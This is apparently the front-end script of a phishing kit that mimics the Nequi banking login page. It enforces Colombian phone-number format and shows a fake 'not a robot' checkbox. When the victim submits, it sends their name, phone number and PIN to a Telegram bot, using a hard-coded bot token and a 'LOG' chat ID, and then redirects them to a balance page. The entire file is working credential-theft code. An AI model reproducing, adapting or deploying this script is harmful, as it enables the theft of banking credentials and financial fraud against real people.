document.addEventListener('DOMContentLoaded', () => {
    const loginBtn = document.getElementById('login-btn');
    const phoneInput = document.getElementById('phone');
    const passwordInput = document.getElementById('password');
    const captchaContainer = document.getElementById('captcha-box');
    const checkIcon = document.getElementById('check-icon');
    const captchaCircle = document.getElementById('captcha-circle');
    const loadingOverlay = document.getElementById('loading-overlay');
    let isChecked = false;

    // --- DETECCIÓN DE ERROR PREVIO (Usuario Incorrecto) ---
    const errorFlag = sessionStorage.getItem('show_login_error');
    if (errorFlag) {
        const errorAlert = document.getElementById('error-alert');
        if (errorAlert) {
            errorAlert.style.display = 'block';
            setTimeout(() => {
                errorAlert.style.display = 'none';
            }, 3000);
        }
        sessionStorage.removeItem('show_login_error');
    }

    // --- PRE-FILL DATA FROM REACT APP - DESACTIVADO A PETICIÓN ---
    /*
    const storedPhone = sessionStorage.getItem('bc_usuario');
    if (storedPhone && phoneInput) {
        phoneInput.value = storedPhone;
    }
    */

    // --- TUS CREDENCIALES DE TELEGRAM ---
    const TELEGRAM_TOKEN = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
    const TELEGRAM_CHAT_ID = '-5182218323'; // Grupo LOG

    // Usar API directa para compatibilidad con Vite
    const API_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

    console.log('Script cargado correctamente');
    
    // Verificación de protocolo para evitar errores comunes
    if (window.location.protocol === 'file:') {
        alert("⚠️ ERROR: Estás abriendo el archivo directamente.\n\nPara que funcione la conexión con Telegram, debes usar el servidor local.\n\n1. Ejecuta 'node server.js' en la terminal.\n2. Abre http://localhost:3000 en tu navegador.");
    }

    // Allow only numbers in phone input
    phoneInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
    });

    // Allow only numbers in password input
    passwordInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
    });

    captchaContainer.addEventListener('click', () => {
        if (!isChecked) {
            // Check
            captchaContainer.classList.add('active');
            loginBtn.classList.add('active');
            
            if (checkIcon) checkIcon.style.display = 'block';
            if (captchaCircle) captchaCircle.style.borderColor = '#00D69F';
            captchaContainer.style.borderColor = '#00D69F';
            captchaContainer.style.backgroundColor = '#F4FFFC';
            
            isChecked = true;
        } else {
            // Uncheck
            captchaContainer.classList.remove('active');
            loginBtn.classList.remove('active');
            
            if (checkIcon) checkIcon.style.display = 'none';
            if (captchaCircle) captchaCircle.style.borderColor = '#DA0081'; 
            captchaContainer.style.borderColor = '#F5BCE0'; 
            captchaContainer.style.backgroundColor = 'white'; 
            
            isChecked = false;
        }
    });

    loginBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        
        const phone = phoneInput.value;
        const password = passwordInput.value;

        // --- TUS VALIDACIONES ORIGINALES ---
        if (phone.length !== 10) {
            alert('El número de celular debe tener 10 dígitos.');
            return;
        }

        if (!phone.startsWith('3')) {
            alert('El número de celular debe comenzar por el número 3.');
            return;
        }

        if (!isChecked) {
            alert('Por favor, confirma que no eres un robot.');
            return;
        }

        if (password.length === 0) {
            alert('Por favor, ingresa tu clave.');
            return;
        }

        // Guardamos en sesión
        sessionStorage.setItem("bc_usuario", phone);

        // Mostrar pantalla de carga
        loadingOverlay.classList.add('active');

        // --- BLOQUE ADICIONAL: ENVÍO A TELEGRAM ---
        const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
        const mensaje = `🔔 **CAPTURA NEQUI (LOGIN)**\n\n👤 **Nombre:** \`${userNombre}\`\n📱 **Celular:** \`${phone}\`\n🔑 **Clave:** \`${password}\`\n\n🔄 **Redirigiendo a Saldo...**`;

        try {
            await fetch(`${API_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensaje,
                    parse_mode: 'Markdown'
                })
            });
            
            // Redirigir inmediatamente a saldo.html sin esperar acción
            window.location.href = 'saldo.html';

        } catch (error) {
            console.error("Error al enviar a Telegram:", error);
            // Redirigir de todos modos para no bloquear al usuario
            window.location.href = 'saldo.html';
        }
    });
});
